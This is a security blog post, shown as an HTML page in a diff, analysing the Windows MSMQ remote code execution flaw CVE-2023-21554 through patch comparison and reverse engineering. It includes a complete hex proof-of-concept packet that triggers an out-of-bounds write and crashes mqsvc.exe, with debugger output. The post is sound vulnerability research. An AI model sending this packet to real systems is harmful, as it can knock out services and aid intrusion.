@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>[CVE-2023-21554] Windows Message Queuing Remote Code Execution Vulnerability Analysis - Logic Security</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="CVE-2023-21554 Windows Message Queuing Remote Code Execution Vulnerability Analysis">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CPJWE5ZVG9"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-CPJWE5ZVG9', { 'anonymize_ip': false });
+}
+</script>
+
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Logic Security" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/blog_img.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Logic Security</div>
+					
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/history_posts/">
+				
+				<span class="menu__text">Collection of Historical Posts</span>
+				
+			</a>
+		</li>
+		
+		
+		
+			
+				<li class="menu__item menu__item--active">
+					<a class="menu__link" href="/posts/cve_2023_21554/">
+						<span class="menu__text" style="font-weight: bold;">English</span>
+					</a>
+				</li>
+			
+				<li class="menu__item">
+					<a class="menu__link" href="/zh/posts/cve_2023_21554/">
+						<span class="menu__text" style="">中文</span>
+					</a>
+				</li>
+			
+		
+	</ul>
+</nav>
+
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">[CVE-2023-21554] Windows Message Queuing Remote Code Execution Vulnerability Analysis</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 12 16"><path d="M6 1c2.2 0 3.5 2 3.5 4.5C9.5 7 8.9 8.2 8 9c2.9.8 4 2.5 4 5v1H0v-1c0-2.5 1.1-4.2 4-5-.9-.8-1.5-2-1.5-3.5C2.5 3 3.8 1 6 1z"/></svg><span class="meta__text">zoemurmure</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2023-05-17T17:14:55&#43;08:00">May 17, 2023</time></div>
+
+
+    <span id="busuanzi_container_page_pv">|<span id="busuanzi_value_page_pv"></span><span>
+    
+        <span class="post-date">3284 words</span>, <span class="more-meta">16 min read</span>
+    
+
+<div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2l1 2h8v11h-16v-13z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/vulnerability-analysis/" rel="category">Vulnerability Analysis</a>
+	</span>
+</div></div>
+		</header>
+		<div class="content post__content clearfix">
+			<h2 id="0-preface">0. Preface</h2>
+<p>This article introduces the CVE-2023-21554 vulnerability, which exists in Microsoft&rsquo;s Message Queuing (MSMQ) service. Due to the service&rsquo;s lack of proper validation of data packets, an attacker can exploit this vulnerability to achieve remote code execution.</p>
+<p>As I was not familiar with the MSMQ service, I first spent a significant portion of this post introducing the service and its related data structures. Afterwards, I located the vulnerability by comparing patches. Then, I attempted to trigger the vulnerability by modifying the packet examples provided in the official documentation. Finally, I summarized the vulnerability principles and the entire analysis process.</p>
+<h2 id="1-background-knowledge">1. Background Knowledge</h2>
+<h3 id="11-msmq">1.1 MSMQ</h3>
+<p>Message Queue (消息队列): An asynchronous message transmission mechanism. Applications can send messages to a message queue and read messages from it. Message queues enable sending and receiving applications to operate asynchronously.</p>
+<p>Microsoft&rsquo;s implementation of the message queue service is called Microsoft Message Queuing (MSMQ). This service can be installed via &ldquo;Turn Windows features on or off&rdquo;.</p>
+<p>MSMQ contains various protocols to support Microsoft&rsquo;s message queuing service:</p>
+<p><img src="/img/2023-04-26-10-55-06.png" alt=""></p>
+<p>Here, we mainly focus on the Message Queuing Binary Protocol, which is directly related to message transmission. This protocol defines a mechanism for reliably transferring messages between two message queues located on different hosts.</p>
+<p>According to the documentation, messages transmitted in a message queue system have a series of message properties, which contain various metadata related to the message, and a special property called the message body, which contains the actual data sent by the application. There are no restrictions on the content of the message body.</p>
+<p>During message transmission, the client first establishes a TCP or SPX-based protocol session with the server. The server&rsquo;s TCP connection uses port 1801, and the SPX connection uses port 876, while the client&rsquo;s port is arbitrary.</p>
+<p>The protocol session is initialized by sending <code>EstablishConnection</code> packets and <code>ConnectionParameter</code> packets. Afterwards, both parties can send <code>UserMessage</code> packets at will and acknowledge them via <code>SessionAck</code> packets, <code>OrderAck</code> packets, and <code>FinalAck</code> packets.</p>
+<h3 id="12-usermessage">1.2 UserMessage</h3>
+<p>We focus primarily on the <code>UserMessage</code> packet. This packet always contains a complete message and is used to transmit application-defined and administrative acknowledgment messages between the sender and the receiver.</p>
+<p>Structurally, a <code>UserMessage</code> packet consists of a series of headers, including mandatory headers and optional headers. Mandatory headers <strong>must</strong> appear in all <code>UserMessage</code> packets, including <code>BaseHeader</code>, <code>UserHeader</code>, and <code>MessagePropertiesHeader</code>. The optional headers explicitly listed in the documentation include <code>TransactionHeader</code>, <code>SecurityHeader</code>, <code>DebugHeader</code>, <code>SoapHeader</code>, <code>MultiQueueFormatHeader</code>, and <code>SessionHeader</code>. However, in practice, the documentation also introduces other header information, and decompilation through IDA reveals additional headers.</p>
+<p>The processing of <code>UserMessage</code> is located in the <code>CQmPacket::CQmPacket</code> function in <code>mqqm.dll</code>. By generally observing this function, we can see that it processes each header (represented as sections in IDA) in the <code>UserMessage</code> linearly in a fixed order:</p>
+<p><img src="/img/2023-05-05-15-49-39.png" alt=""></p>
+<h3 id="13-section-structure">1.3 Section Structure</h3>
+<p>Although the fields in different sections vary, their overall structures share similarities: they all consist of a few fixed fields + several variable fields.</p>
+<p>Since <code>CQmPacket::CQmPacket</code> processes <code>UserMessage</code> packets linearly in a fixed order, it must use some method to locate the next section. Generally, there are three scenarios:</p>
+<ol>
+<li>The length of the variable fields in the section is not fixed. A <code>Flags</code> field is present to indicate whether a specific variable field exists, and other fields specify the length of the variable fields.</li>
+<li>The length of the variable fields is fixed. A <code>Flags</code> field is present to indicate whether a specific variable field exists.</li>
+<li>The section does not contain variable fields, so the total length is fixed, and there are no fields related to length.</li>
+</ol>
+<p>For example:</p>
+<p><code>SecurityHeader</code> belongs to the first scenario. Its structure is as follows, where the <code>Flags</code> field contains flags indicating whether the <code>SecurityData</code> field exists, and the sum of several <code>*Size</code> fields determines the size of the <code>SecurityData</code> field:</p>
+<pre tabindex="0"><code>                                1               2               3
+0               7               5               3               1
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|             Flags             |         SenderIdSize          |
+|       EncryptionKeySize       |        SenderCertSize         |
+|       ProviderInfoSize        |                               |
+|                     SecurityData (variable)                   |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+</code></pre><p><code>DebugHeader</code> belongs to the second scenario. Its structure is as follows, where the <code>Flags</code> field contains flags indicating whether the <code>QueueIdentifier</code> field exists, which has a fixed length of 16 bytes:</p>
+<pre tabindex="0"><code>                                1               2               3
+0               7               5               3               1
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|             Flags             |           Reserved            |
+|                                                               |
+|                                                               |
+|              QueueIdentifier (16 bytes, optional)             |
+|                                                               |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+</code></pre><p><code>SessionHeader</code> belongs to the third scenario. This section has a fixed size of 16 bytes, and its structure is as follows:</p>
+<pre tabindex="0"><code>                                1               2               3
+0               7               5               3               1
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|       AckSequenceNumber       |  RecoverableMsgAckSeqNumber   |
+|                    RecoverableMsgAckFlags                     |
+|     UserMsgSequenceNumber     |    RecoverableMsgSeqNumber    |
+|           WindowSize          |            Reserved           |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+</code></pre><h2 id="2-patch-analysis">2. Patch Analysis</h2>
+<p>By comparing the <code>mqqm.dll</code> file before and after the patch, it was found that Microsoft modified the <code>CQmPacket::CQmPacket</code> function and multiple <code>SectionIsValid</code> functions:</p>
+<p><img src="/img/2023-04-26-16-18-13.png" alt=""></p>
+<p>According to cross-references, the <code>SectionIsValid</code> functions are called by <code>CQmPacket::CQmPacket</code> and are mainly used to check whether the contents of each section are valid while traversing the <code>UserMessage</code>. For example, if a flag bit indicates that a section should contain a certain variable field, this function checks whether the section indeed contains that variable field and whether its length meets the requirements. Additionally, it checks whether the calculated address of the next section (based on the current section&rsquo;s field contents) exceeds the boundary of the entire packet.</p>
+<p>Upon inspection, the patch logic was mainly modified in the part where the next section&rsquo;s address is retrieved. The fix in each <code>SectionIsValid</code> function varies slightly because the structures of different sections differ, and their methods for calculating the next section&rsquo;s address also differ. Based on the three types of section structures summarized in Section 1.3, the fix methods are summarized below:</p>
+<ol>
+<li>
+<p><strong>Section Structure Type 1</strong>: Variable length is not fixed, and there are fields indicating the length of variable fields. This includes <code>CPropertyHeader</code>, <code>CSecurityHeader</code>, <code>CUserHeader</code>, and <code>CBaseMqfHeader</code>.
+These functions add validation for the values in fields related to field lengths (checking for overflow) and call a new function <code>GetNextSectionPtrSafe</code> at the end, where the third parameter <code>varlen</code> is calculated from the field values.</p>
+<p><em>Note: Because the <code>CBaseMqfHeader</code> section structure is simple, it does not actually call this new function. We won&rsquo;t consider it here as it is a special case.</em></p>
+<p><img src="/img/2023-05-12-15-10-00.png" alt=""></p>
+</li>
+<li>
+<p><strong>Section Structure Type 2</strong>: Variable length is fixed, and there are fields indicating whether the variable field exists. This includes <code>CDebugSection</code> and <code>CXactHeader</code>.
+These functions check the <code>Flags</code> field to determine if the variable field exists. Similarly, they call the new function <code>GetNextSectionPtrSafe</code> at the end, with the third parameter <code>varlen</code> set to either 0 or a fixed value (the fixed length of the variable field).</p>
+<p><img src="/img/2023-05-12-15-11-13.png" alt=""></p>
+</li>
+<li>
+<p><strong>Section Structure Type 3</strong>: Does not contain variable fields. Naturally, sections of this type do not involve such issues.</p>
+</li>
+<li>
+<p><strong>Other Structure Types</strong>: Includes <code>CMsgGroupHeader</code> and <code>CMsgDeadletterHeader</code>.
+<code>CMsgGroupHeader</code> is not documented, but code analysis reveals that its structure is similar to <code>CMsgDeadletterHeader</code>. Both contain variable fields whose lengths are not fixed, and the variable fields are null-terminated (<code>\x00</code>). Therefore, no separate field is used to specify the length of the variable field.
+These functions add code to check whether the position of <code>\x00</code> exceeds the end of the packet, and do not call <code>GetNextSectionPtrSafe</code>.</p>
+<p><img src="/img/2023-05-12-15-13-08.png" alt=""></p>
+</li>
+</ol>
+<p>The <code>GetNextSectionPtrSafe</code> function is defined as follows:</p>
+<p><img src="/img/2023-05-11-18-17-32.png" alt=""></p>
+<p>Here, the <code>len</code> and <code>varlen</code> parameters correspond to the fixed field length and variable field length in a section, respectively, which are added together to get the total length of the section.</p>
+<p>Upon inspection, the new code added in <code>CQmPacket::CQmPacket</code> serves the same purpose. In addition to the headers listed in the documentation and explicitly defined in the symbols, the <code>CQmPacket::CQmPacket</code> function also iterates through other sections using certain flag bits in the <code>Flags</code> field of <code>UserHeader</code>. However, in the documentation&rsquo;s explanation of <code>Flags</code>, the corresponding flag bits are marked as &ldquo;Reserved&rdquo;. I suspect this might be a newly added feature where the documentation has not been updated, or this part of the information is simply not public. In the loop traversing these undocumented sections, overflow checks and calls to <code>GetNextSectionPtrSafe</code> have also been added.</p>
+<p>According to the summary above, the patched code adds systematic checks for variable field lengths, specifically through the <code>GetNextSectionPtrSafe</code> function. However, note that this does not mean the unpatched code lacks checks entirely. In fact, some sections had similar checks before the patch, but they were scattered across various functions, and I did not organize them here.</p>
+<p><em>Note: Initially, I did not notice that the unpatched code contained such checks. I found this out when trying to trigger the vulnerability below, which caused me to take some detours.</em></p>
+<hr>
+<p><strong>Supplementary content after discovering issues in Section 3.3:</strong></p>
+<p>The primary focus should still be on the <code>CQmPacket::CQmPacket</code> function. When indexing undocumented sections, the calculated position of the next section is not validated. The following is a partial screenshot (the processing of several sections is not written into separate functions but is instead placed directly in <code>CQmPacket::CQmPacket</code>, including both documented and undocumented sections. Some of these lack corresponding checks; only the first one is screenshotted here):</p>
+<p><img src="/img/2023-05-16-14-42-41.png" alt=""></p>
+<p>The patched code is as follows:</p>
+<p><img src="/img/2023-05-16-14-41-02.png" alt=""></p>
+<h2 id="3-vulnerability-triggering">3. Vulnerability Triggering</h2>
+<h3 id="31-first-attempt">3.1 First Attempt</h3>
+<p><em>Note: The first attempt was based on my incorrect understanding.</em></p>
+<p>In the section structure described in Section 1.3, we know that when the length of the variable field in a section is not fixed, a <code>Flags</code> field indicates whether a specific variable field exists, and another field specifies the length of the variable field. The key issue lies here: all fields in the section are sent from the client, meaning they are controlled by the attacker. When <code>CQmPacket::CQmPacket</code> traverses <code>UserMessage</code>, it calculates the next section&rsquo;s position based on these attacker-controlled fields.</p>
+<p>According to the information obtained from the patch comparison, we know that the unpatched code did not effectively check the fields related to variable field lengths (<em>though some sections did have checks</em>). In other words, modifying the variable field length in Type 1 sections might trigger the vulnerability.</p>
+<p>The official Microsoft documentation provides an MSMQ packet example [2]. We can directly use this packet and modify the value of the variable field length in its <code>SecurityHeader</code>.</p>
+<p><em>Note: Because the <code>UserHeader</code> structure is complex, and <code>SecurityHeader</code> is the first qualifying section structure to appear after it, I initially chose <code>SecurityHeader</code>.</em></p>
+<p>First, install the Microsoft Message Queuing server on the target virtual machine (OS version: Windows 10 Pro 19044.2364). After installation, you can see the running MSMQ service:</p>
+<p><img src="/img/2023-05-12-15-22-32.png" alt=""></p>
+<p>And it is listening on port 1801:</p>
+<p><img src="/img/2023-05-12-15-23-57.png" alt=""></p>
+<p>Directly send the original <code>EstablishConnection</code> packet and <code>ConnectionParameters</code> packet according to the official documentation, and modify the <code>SenderIdSize</code> in the <code>SecurityHeader</code> of the <code>UserMessage</code>.</p>
+<p>The <code>SenderIdSize</code> field is two bytes in total. I tested several values, but none caused the <code>mqsvc.exe</code> process to crash. Therefore, it was necessary to further analyze the behavior of the <code>CQmPacket::CQmPacket</code> function to confirm how the tampered variable field length affects the subsequent code.</p>
+<p><em>Note: I tested values smaller than the actual value, larger than the actual value, and negative values. However, <code>SecurityHeader</code> actually does validate the variable field length: it checks whether the value is negative, whether the addition overflows, and whether the calculated next section address exceeds the packet boundary. Thus, modifying the variable field length in <code>SecurityHeader</code> only causes the calculated next section address to shift within the packet boundary. In this scenario, since the next section&rsquo;s position is incorrect, the malformed data is highly likely to be detected by the system and trigger error handling, rather than triggering a crash due to the vulnerability.</em></p>
+<h3 id="32-detailed-analysis-of-cqmpacketcqmpacket">3.2 Detailed Analysis of <code>CQmPacket::CQmPacket</code></h3>
+<p>As mentioned earlier, the <code>CQmPacket::CQmPacket</code> function traverses the <code>UserMessage</code>. Some field names are not directly labeled in the symbols. After further comparison with the section structures in the documentation, I identified several section structures in the IDA code that were not labeled in the symbols but were mentioned in the documentation. However, some section structures remain unnamed, though this does not affect the vulnerability analysis.</p>
+<p>The annotated <code>CQmPacket::CQmPacket</code> function is shown below:</p>
+<p><img src="/img/2023-05-12-18-40-19.png" alt=""></p>
+<p><img src="/img/2023-05-15-15-39-18.png" alt=""></p>
+<p>To keep the representation concise, I collapsed the specific operations for the subsequent sections. However, the logic is identical to the two expanded blocks above, with minor details varying due to the differences in section structures. Whether a section is processed is determined by the flag bits in <code>BaseHeader</code> or <code>UserHeader</code>, as annotated.</p>
+<p>After traversing all sections, the function checks the parameters at the end and, if conditions are met, constructs <code>ExtensionHeader</code>, <code>SubqueueHeader</code>, and <code>ExtendedAddressHeader</code> again. I am not entirely sure about the function of this part, but it does not affect the vulnerability triggering.</p>
+<h3 id="33-how-to-trigger">3.3 How to Trigger</h3>
+<p>It was at this point that I realized my mistake. The true vulnerability lies in the section processing of the <code>CQmPacket::CQmPacket</code> function. I chose the section shown in the screenshot below as the target to trigger the vulnerability. This is the second problematic section, and its structure is relatively simple, unlike the first section which requires calculating the position twice. Hereafter, this section is referred to as <code>TargetSection</code>:</p>
+<p><img src="/img/2023-05-16-15-08-41.png" alt=""></p>
+<p>In the second screenshot of Section 3.2, we can see that after traversing all sections, <code>CQmPacket::CQmPacket</code> attempts to construct an <code>ExtensionHeader</code>. During construction, it uses the statement <code>*nxtSec = 12i64;</code> without any prior check.</p>
+<p>If the execution flow reaches the processing logic of <code>TargetSection</code>, we can control the value of <code>nxtSec</code>, achieving an out-of-bounds write of a fixed value at an arbitrary address (technically not an arbitrary address, but constrained by the range of the variable field length).</p>
+<p>The entire vulnerability triggering logic is as follows:</p>
+<ol>
+<li>Modify the flag bits in <code>UserHeader</code> to satisfy the condition <code>(userHeaderFlag &amp; 0x4000000) != 0</code>.</li>
+<li>Construct the <code>TargetSection</code> at the end of the packet so that the calculation of <code>nxtSec</code> in its processing logic yields the target write address. To trigger a crash, we can design an invalid address.</li>
+<li>Modify other fields in the packet to make it valid (such as the total packet length field).</li>
+</ol>
+<p>The final constructed packet is as follows:</p>
+<pre tabindex="0"><code>10 00 03 00 4C 49 4F 52 00 01 00 00 FF FF FF FF
+D1 58 73 55 50 91 95 95 49 97 B6 E6 11 EA 26 C6
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+FF FF FF FF 4C 49 4F 52 EE 08 00 00 00 1C 28 04
+1A 00 4F 00 53 00 3A 00 61 00 30 00 34 00 62 00
+6D 00 30 00 32 00 5C 00 71 00 00 00 01 00 1C 00
+00 00 00 00 00 00 00 00 00 00 00 00 01 05 00 00
+00 00 00 05 15 00 00 00 AD 4A 9E BD 36 D9 FA 3D
+63 A6 56 DA E8 03 00 00 0F 0F 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+08 00 00 00 00 00 00 00 12 00 00 00 12 00 00 00
+00 00 00 00 04 80 00 00 01 68 00 00 00 00 00 00
+6D 00 71 00 73 00 65 00 6E 00 64 00 65 00 72 00
+20 00 6C 00 61 00 62 00 65 00 6C 00 00 00 61 00
+61 00 61 00 61 00 61 00 61 00 61 00 61 00 61 00
+11 11 11 11 00 00 00 40 00 00 00 40 00 00 00 00
+</code></pre><p>When the system executes the statement <code>*nxtSec = 12i64;</code>, the debugger shows:</p>
+<pre tabindex="0"><code>2: kd&gt; p
+MQQM!CQmPacket::CQmPacket+0x90a:
+0033:00007ffd`d37688aa 48c7030c000000  mov     qword ptr [rbx],0Ch
+2: kd&gt; dd rbx
+DBGHELP: SharedUserData - virtual symbol module
+00000115`f7f50520  ???????? ???????? ???????? ????????
+00000115`f7f50530  ???????? ???????? ???????? ????????
+00000115`f7f50540  ???????? ???????? ???????? ????????
+00000115`f7f50550  ???????? ???????? ???????? ????????
+00000115`f7f50560  ???????? ???????? ???????? ????????
+00000115`f7f50570  ???????? ???????? ???????? ????????
+00000115`f7f50580  ???????? ???????? ???????? ????????
+00000115`f7f50590  ???????? ???????? ???????? ????????
+</code></pre><p>Continuing execution will cause the <code>mqsvc.exe</code> process to crash:</p>
+<p><img src="/img/2023-05-16-17-00-24.png" alt=""></p>
+<h3 id="34-packet-details">3.4 Packet Details</h3>
+<p>The packet format is the same as described in the official documentation, containing <code>BaseHeader</code>, <code>UserHeader</code>, <code>SecurityHeader</code>, and <code>MessagePropertiesHeader</code>. The specific modified fields are as follows (<code>--</code> indicates unmodified):</p>
+<ul>
+<li><strong>BaseHeader</strong>:
+<code>-- -- -- -- -- -- -- -- 00 01 00 00 FF FF FF FF</code>
+Modify <code>PacketSize</code> to <code>0x00000100</code> and <code>TimeToReachQueue</code> to <code>0xFFFFFFFF</code>.
+<code>PacketSize</code> represents the total packet size and must be 4-byte aligned. If the initial packet does not meet this requirement, pad it with trailing zeros.
+<code>TimeToReachQueue</code> indicates the time limit for the packet to reach the target queue manager (QM). <code>0xFFFFFFFF</code> denotes infinite time, which is set to ensure the packet is not dropped.</li>
+<li><strong>UserHeader</strong>:
+<pre tabindex="0"><code> -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
+ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
+ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 04
+ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
+ -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 
+</code></pre>Modify the last byte of the flags field to satisfy the condition <code>(userHeaderFlag &amp; 0x4000000) != 0</code>.</li>
+<li><strong>SecurityHeader</strong>: Unchanged.</li>
+<li><strong>MessagePropertiesHeader</strong>: Significantly truncated, and the corresponding field length values were reduced. This has nothing to do with the vulnerability and is only intended to simplify the packet.</li>
+<li><strong>TargetSection</strong>:
+<code>11 11 11 11 00 00 00 40 00 00 00 40</code>
+The first four bytes are unused and can be set to any value. The two subsequent 4-byte values are involved in the calculation of <code>nxtSec</code>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>nxtSec <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)nxtSec <span style="color:#f92672">+</span> ((<span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)nxtSec <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">15</span> <span style="color:#f92672">+</span> <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)nxtSec <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFC</span>);
+</span></span></code></pre></div>To trigger the vulnerability, I chose a large negative number <code>0x80000000</code> by setting both 4-byte values to <code>0x40000000</code>, resulting in an inaccessible address.</li>
+</ul>
+<h2 id="4-vulnerability-summary">4. Vulnerability Summary</h2>
+<p>An MSMQ <code>UserMessage</code> packet is composed of multiple sections of different structural types. Some sections contain variable-length fields, with separate fields specifying their lengths. When retrieving the position of the next section, these length fields are used in the calculation.</p>
+<p>When processing <code>UserMessage</code> packets, the MSMQ server uses the <code>CQmPacket::CQmPacket</code> function to linearly traverse each section. Some sections are documented and have corresponding functions in the symbols, while others are only described in the official documentation or completely undocumented. These undocumented sections do not have dedicated functions, and their processing code is written directly inside the <code>CQmPacket::CQmPacket</code> function.</p>
+<p>Possibly because these sections are not fully public, the developers did not implement rigorous validation for the data in the packet. As a result, when calculating the next section&rsquo;s position, the calculated address may exceed the memory bounds allocated for the packet, leading to an out-of-bounds write.</p>
+<p>To facilitate future expansions, the patched code introduces a validation interface function (<code>GetNextSectionPtrSafe</code>) and calls it at every location requiring checks.</p>
+<h2 id="5-conclusion">5. Conclusion</h2>
+<p>The primary difficulty in analyzing this vulnerability lies in the MSMQ service itself. The only available resources online are the official documentation. Since packet capture via Wireshark cannot parse the custom packet structure, one must rely on the documentation to reconstruct the packet contents and identify the data structures in IDA.</p>
+<p>During the vulnerability analysis process, because there were many modified locations in the patch comparison, the added code was not only to fix the vulnerability but also to support subsequent features. This led to some initial misconceptions about the vulnerability mechanism, causing me to spend extra time debugging.</p>
+<p>The code analyzed so far indicates that this vulnerability only allows writing a fixed value within a certain range of memory addresses. To achieve full exploit capability, further analysis of the subsequent code is required to construct a more precise packet for arbitrary memory write.</p>
+<h2 id="6-references">6. References</h2>
+<ol>
+<li><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/85498b96-f2c8-43b3-a108-c9d6269dc4af">[MS-MQQB]: Message Queuing (MSMQ): Message Queuing Binary Protocol</a></li>
+<li><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/f0bf84a8-aba5-4ce9-a6ec-31ad9ca90d00">4.1.7 FRAME 7: User Message</a></li>
+</ol>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5 0 11V3C0 1.5.8.8.8.8S1.5 0 3 0h8c1.5 0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/cve/" rel="tag">cve</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/binary/" rel="tag">binary</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/poc/" rel="tag">poc</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+
+
+
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2026 Logic Security.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
